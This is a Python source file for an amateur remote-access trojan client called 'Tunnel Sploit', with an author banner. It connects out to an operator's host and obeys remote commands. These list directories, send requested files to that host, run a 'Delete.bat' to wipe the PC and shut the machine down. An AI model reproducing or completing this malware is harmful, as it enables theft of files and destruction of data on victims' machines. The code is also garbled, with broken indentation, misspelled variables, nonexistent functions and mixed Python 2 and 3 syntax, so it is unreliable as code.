#there is more to come
import os
import time
import subprocess
try:
  import socket

  except ImportError:
        print "Please Try Installing Sockets (Type Pip install Sockets in CMD)"
        sys.exit(1)
except KeyboardInterrupt:
        print "Exiting the tunnel"
        sys.exit(1)

banner = '''
  _____                       _ ____        _       _ _   
 |_   _|   _ _ __  _ __   ___| / ___| _ __ | | ___ (_) |_ 
   | || | | | '_ \| '_ \ / _ \ \___ \| '_ \| |/ _ \| | __|
   | || |_| | | | | | | |  __/ |___) | |_) | | (_) | | |_ 
   |_| \__,_|_| |_|_| |_|\___|_|____/| .__/|_|\___/|_|\__|
                                     |_|                  
Client 

Tunnel Sploit 2018 Edition made by Blood instagram:mrunityx discord:メBloodソッ#8340
Any issues contact me my email is unityxstore@outlook.com 

'''

print(banner)
s = socket.socket()
port=8080
host = input(ste("Enter The Tunnel ip :"))
s.connect((host,port))
print(".......")
time.sleep(5)
print("Tunnel detected at", host)
time.sleep(5)
print(".........")
time.sleep(1)
print("Clearing in 5")
time.sleep(1)
print("Clearing in 4")
time.sleep(1)
print("Clearing in 3")
time.sleep(1)
print("Clearing in 2")
time.sleep(1)
print("Clearing in 1")
time.sleep(1)
print("NOW!!!")
os.system('clear')
print(banner)

#commands
while 1:
  print("")
  command = s.recv(1024)
  command = command.decode()
  print("Command Recieved")
  if command == "view_cwd":
    files = os.getcwd()
    files = str(files)
    s.send("".encode())
    s.send(files.encode())
    print("Command executed")
     elif command == "Custom dir":
       user_input = s.recv(6000)
       user_input = user_input.decode()
       files = os.listdir(usee_input)
       files = str(files)
       s.send(files.encode())
       print("")
       print("Command Executed")
     elif command == "Ftp Slave":
          file_path = s.recv(6000)
          file_path = file_path.decode()
          file = open(file_path, "rb")
          data = file.read()
          s.send(data)
          print("")
         print("File sent")

       elif command == "Kill Pc":
       print("Killed There Pc")
       s.recv(6000)
       os.system("Delete.bat")
       
       elif command == "Shutdown":
       print("Shutting There Pc down")
       s.recv(6000)
       os.system("Shutdown.bat")

       elif command == "ipconfig":
       user_input = s.recv(6000)
       user_input = user_input.decode()
       ip = os.ipconfig(user_input)
       ip = str(ip)
       s.send(ip.encode())
       print("")
       
       print("Command Executed")
     else:
      print("")
      print(".................")
      print("Command not Available at this time. It may be in future versions")
